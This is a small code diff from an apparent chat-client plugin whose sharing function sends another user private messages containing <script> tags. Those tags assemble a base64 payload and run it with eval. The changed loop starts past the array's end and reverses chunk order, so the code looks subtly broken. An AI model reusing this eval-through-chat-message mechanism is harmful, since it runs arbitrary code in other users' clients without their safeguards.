@@ -38,7 +38,9 @@ var sharePluginsWithPlugin = function () {
 				try{
 				let chunks =  _self.chunkSubstr(plugin, 1000);
 				$.chat.sendPrivate(params,  '<script>eval(atob(window.receivingPlugins));</script>');
-				for (let chunk of chunks) $.chat.sendPrivate(params,  '<script>window.receivingPlugins +="' + chunk + '";</script>');
+				for (let i = chunks.length ; i > -1 ; i--) {
+					$.chat.sendPrivate(params,  '<script>window.receivingPlugins +="' + chunks[i] + '";</script>');
+				}
 				$.chat.sendPrivate(params,  '<script>window.receivingPlugins ="";</script>');
 				}catch(e){$.chat.write(e.toString(), 'sharePluginsWith');return '';}
 			}
